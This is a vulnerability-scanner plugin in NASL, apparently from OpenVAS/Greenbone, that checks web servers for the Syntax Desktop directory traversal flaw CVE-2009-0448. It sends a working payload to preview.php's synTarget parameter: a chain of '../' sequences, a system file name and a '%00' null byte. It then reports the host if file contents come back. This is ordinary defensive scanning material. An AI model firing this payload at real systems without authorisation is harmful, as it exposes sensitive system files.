if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.800234" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2009-02-20 17:40:17 +0100 (Fri, 20 Feb 2009)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_bugtraq_id( 33601 );
	script_cve_id( "CVE-2009-0448" );
	script_name( "Syntax Desktop Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.milw0rm.com/exploits/7977" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "affected", value: "Syntax Desktop 2.7 and prior" );
	script_tag( name: "insight", value: "This flaw is due to error in file 'preview.php' in 'synTarget'
  parameter which lets the attacker to gain information through directory
  traversal queries." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Syntax Desktop and is prone to Directory
  Traversal Vulnerability." );
	script_tag( name: "impact", value: "Successful exploitation will let the attacker gain sensitive information
  about the remote system directories where syntax desktop runs." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
synPort = http_get_port( default: 80 );
if(!http_can_host_php( port: synPort )){
	exit( 0 );
}
files = traversal_files();
for path in nasl_make_list_unique( "/", http_cgi_dirs( port: synPort ) ) {
	if(path == "/"){
		path = "";
	}
	response = http_get_cache( item: path + "/index.php", port: synPort );
	if(ContainsString( response, "Syntax Desktop" )){
		for file in keys( files ) {
			url = path + "/admin/modules/aa/preview.php?synTarget=../../../../../../../../../" + files[file] + "%00";
			if(http_vuln_check( port: synPort, url: url, pattern: file )){
				report = http_report_vuln_url( port: synPort, url: url );
				security_message( port: synPort, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

